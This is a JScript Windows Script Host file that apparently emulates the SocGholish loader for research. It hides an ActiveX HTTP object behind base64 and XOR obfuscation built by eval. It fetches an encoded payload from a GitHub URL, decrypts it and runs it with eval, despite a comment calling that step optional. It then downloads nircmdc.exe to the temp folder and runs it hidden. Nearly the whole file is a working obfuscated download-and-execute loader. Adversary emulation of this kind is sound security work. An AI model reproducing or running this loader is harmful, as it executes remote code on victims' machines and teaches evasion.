function decode(inputStr) {
    var base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    var result = '';
    var charCount = 0;
    var bits = 0;
    var i, val;

    for (i = 0; i < inputStr.length; i++) {
        if (inputStr.charAt(i) === '=') break; // Padding character, stop here

        val = base64chars.indexOf(inputStr.charAt(i));
        if (val === -1) continue; // Skip invalid characters

        bits = (bits << 6) | val;
        charCount++;

        if (charCount === 4) {
            result += String.fromCharCode((bits >> 16) & 0xFF);
            result += String.fromCharCode((bits >> 8) & 0xFF);
            result += String.fromCharCode(bits & 0xFF);
            bits = 0;
            charCount = 0;
        }
    }

    // Handling the remaining bits for non-padded input
    if (charCount) {
        bits <<= 6 * (4 - charCount);
        result += String.fromCharCode((bits >> 16) & 0xFF);
        if (charCount === 3) {
            result += String.fromCharCode((bits >> 8) & 0xFF);
        }
    }

    return result;
}

function decrypt(inputStr, cycles) {
    var result = inputStr;
    var cycle, i, cycleKey, tempResult, decryptedChar;

    for (cycle = cycles; cycle > 0; cycle--) {
        tempResult = '';
        cycleKey = (cycle * 123) % 256;
        for (i = 0; i < result.length; i++) {
            decryptedChar = String.fromCharCode(result.charCodeAt(i) ^ cycleKey);
            tempResult += decryptedChar;
        }
        result = tempResult;
    }
    return result;
}

function downloadAndExecuteNirCmd(nirCmdUrl) {
    var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
    xmlhttp.open("GET", nirCmdUrl, false);
    xmlhttp.send();

    if (xmlhttp.status === 200) {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var tempFolder = fso.GetSpecialFolder(2); // Temporary Folder
        var nirCmdFile = fso.BuildPath(tempFolder.Path, "nircmd.exe");
        
        var file = fso.CreateTextFile(nirCmdFile, true);
        file.Write(xmlhttp.responseBody);
        file.Close();

        // Execute NirCmd command to create desktop shortcut
        var wshShell = new ActiveXObject("WScript.Shell");
        var command = nirCmdFile + " urlshortcut \"https://www.google.com\" \"~$folder.desktop$\" \"Google\"";
        wshShell.Run(command, 0, true);
    } else {
        WScript.Echo("Failed to download NirCmd. HTTP Status: " + xmlhttp.status);
    }
}



var mapping = {
    _0x1111:"UXNkeWZ1SA==", // ActiveX
    _0x2222:"X3J6dXNkODI=", // Object("
    _0x3333:"XUNIXVwiPkg=", // MSXML2.X
    _0x4444:"XVxYRERAMjk=", // MLHTTP")
    _0x5555:"fnVnMA=="      // new 
}

// Create an instance of the MSXML2.XMLHTTP object
// var XmlHttp_Object = new ActiveXObject("MSXML2.XMLHTTP");
var _a0x7821 = decrypt(decode(mapping._0x1111), 4) + decrypt(decode(mapping._0x2222), 4)
+ decrypt(decode(mapping._0x3333), 4) + decrypt(decode(mapping._0x4444), 4);
var _a0x2346 = decrypt(decode(mapping._0x5555), 4) + _a0x7821; 


var XmlHttp_Object = eval(_a0x2346);

// URL of the JavaScript file on GitHub
var githubFileUrl = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/encoded-payload.txt";

// Open a GET request
XmlHttp_Object.open("GET", githubFileUrl, false); // 'false' for synchronous request

// Send the request
XmlHttp_Object.send();

if (XmlHttp_Object.status === 200) {
    // Successfully retrieved the file
    var fileContent = XmlHttp_Object.responseText;
    // WScript.Echo("File content:\n" + fileContent);

    // Optional: If you want to execute the fetched JavaScript content
    // Be cautious with using eval, especially with content fetched from the internet
    // eval(fileContent);
} else {
    // Handle errors, e.g., file not found or network issues
    console.error("Error fetching file: HTTP status " + XmlHttp_Object.status);
}

var payload = decrypt(decode(fileContent), 4);
this[eval(payload)];

downloadAndExecuteNirCmd("https://github.com/alekzandr/Research/raw/main/SocGholish%20Tests/Version%202/nircmdc.exe");
